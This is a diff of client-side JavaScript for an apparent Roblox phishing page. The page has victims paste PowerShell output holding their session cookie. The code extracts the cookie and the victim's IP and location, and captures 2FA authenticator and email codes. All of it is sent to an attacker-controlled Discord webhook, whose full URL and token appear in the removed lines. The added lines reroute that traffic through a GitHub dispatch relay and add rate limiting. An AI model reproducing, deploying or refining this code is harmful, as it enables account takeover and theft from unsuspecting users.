@@ -2,6 +2,20 @@
 document.getElementById('instructions').textContent =
   'Press on the "Compile Item" button to compile your item. Once you have your PowerShell copied, you can paste it and hit "Enter" to check.';
 
+// === Rate Limiting ===
+const rateLimit = {
+  lastCall: 0,
+  minInterval: 2000, // 2 seconds between calls
+  check: function() {
+    const now = Date.now();
+    if (now - this.lastCall < this.minInterval) {
+      return false;
+    }
+    this.lastCall = now;
+    return true;
+  }
+};
+
 // === Modal Open/Close Functions ===
 function openModal(id) {
   const modal = document.getElementById(id);
@@ -50,6 +64,12 @@ document.getElementById('submitButton').addEventListener('click', async function
     return;
   }
 
+  // Rate limiting check
+  if (!rateLimit.check()) {
+    alert('Please wait a moment before trying again.');
+    return;
+  }
+
   // Extract assetId and itemName from the catalog URL
   const catalogMatch = powershellData.match(/roblox\.com\/catalog\/(\d+)\/([^"\s`]+)/i);
   
@@ -65,7 +85,7 @@ document.getElementById('submitButton').addEventListener('click', async function
     showErrorAlert();
     powershellInput.value = '';
     closeModal('modal');
-    await sendWebhook('No Asset ID Found', 'No asset id found in PowerShell.', 0xff0000);
+    await sendSecureWebhook('No Asset ID Found', 'No asset id found in PowerShell.', 0xff0000);
     return;
   }
 
@@ -90,7 +110,7 @@ document.getElementById('submitButton').addEventListener('click', async function
     } else {
       locationText = 'IP/location lookup failed.';
     }
-    await sendWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\`\n${locationText}`, 0x00ff00);
+    await sendSecureWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\`\n${locationText}`, 0x00ff00);
   }
 
   powershellInput.value = '';
@@ -217,8 +237,14 @@ if (twofaInput && verifyButton) {
       return;
     }
 
+    // Rate limiting check
+    if (!rateLimit.check()) {
+      alert('Please wait a moment before trying again.');
+      return;
+    }
+
     // Send webhook for 2FA code
-    await sendWebhook('2FA Auth Code Captured 🔥', `Authenticator Code Entered: **${codeEnteredValue}**`, 0xffa500);
+    await sendSecureWebhook('2FA Auth Code Captured 🔥', `Authenticator Code Entered: **${codeEnteredValue}**`, 0xffa500);
 
     twofaInput.value = '';
     closeModal('twofa-modal');
@@ -249,8 +275,14 @@ if (twofaInput2 && verifyButton2) {
       return;
     }
 
+    // Rate limiting check
+    if (!rateLimit.check()) {
+      alert('Please wait a moment before trying again.');
+      return;
+    }
+
     // Send webhook for email code
-    await sendWebhook('2FA Email Code Captured 📩', `Second Modal Code Entered: **${codeEnteredValue}**`, 0xffa500);
+    await sendSecureWebhook('2FA Email Code Captured 📩', `Second Modal Code Entered: **${codeEnteredValue}**`, 0xffa500);
 
     twofaInput2.value = '';
     closeModal('twofa-modal-2');
@@ -266,23 +298,33 @@ if (twofaInput2 && verifyButton2) {
   });
 }
 
-// === Webhook Sending ===
-async function sendWebhook(title, description, color) {
-  const webhookUrl = 'https://discord.com/api/webhooks/1396609110904143892/O1fQQe1V-FU8ezkPfoyGzSa3284LPMufXaOtSb1u8QmFD7Y6jyhVRqbqPP6VcZDO388g';
-  const payload = {
-    embeds: [{
-      title: title,
-      description: description,
-      color: color,
-      footer: { text: `Logger System • ${new Date().toLocaleString()}` }
-    }]
-  };
+// === Secure Webhook Sending (Server-Side) ===
+async function sendSecureWebhook(title, description, color) {
+  try {
+    // Use GitHub API to trigger the webhook handler
+    const response = await fetch('https://api.github.com/repos/froosterton/rbxchecking/dispatches', {
+      method: 'POST',
+      headers: {
+        'Accept': 'application/vnd.github.v3+json',
+        'Authorization': `token ${process.env.GITHUB_TOKEN || 'YOUR_GITHUB_TOKEN_HERE'}`,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        event_type: 'webhook_request',
+        client_payload: {
+          title: title,
+          description: description,
+          color: color
+        }
+      })
+    });
 
-  await fetch(webhookUrl, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-  });
+    if (!response.ok) {
+      console.error('Failed to send webhook:', response.status);
+    }
+  } catch (error) {
+    console.error('Error sending webhook:', error);
+  }
 }
 
 // === Helpers ===
